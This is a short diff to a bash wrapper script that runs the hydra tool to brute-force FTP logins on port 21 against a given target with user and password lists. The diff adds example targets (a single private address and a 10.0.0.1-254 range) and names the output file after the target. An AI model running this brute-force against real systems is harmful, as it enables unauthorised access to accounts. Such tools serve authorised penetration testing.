@@ -2,11 +2,14 @@
 usage () {
     echo "[*] FTP login brute force"
     echo "[*] Usage : $0 <target> <user.lst> <pass.lst>"
+    echo "[*] Ex1 : $0 10.0.0.1-254"
+    echo "[*] Ex2 : $0 192.168.1.20"
     exit 1
 }
 
 if [ $# -eq 3 ]; then
-    hydra -L $2 -P $3 -f -o ftp-hydra.txt -u $1 -s 21 ftp
+    hydra -L $2 -P $3 -f -o ftp-hydra-$1.txt -u $1 -s 21 ftp
+    exit 0
 else
     usage
 fi
